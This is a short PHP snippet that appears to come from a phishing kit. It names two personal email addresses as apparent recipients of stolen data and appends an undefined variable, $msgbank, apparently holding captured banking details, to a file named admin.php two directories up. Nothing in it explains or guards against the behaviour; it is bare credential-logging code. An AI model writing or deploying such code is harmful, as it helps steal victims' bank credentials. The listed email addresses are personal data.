<?php

$yourmail  = 'ashraf.khalid53@gmail.com,xmanemnsdkj@yahoo.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>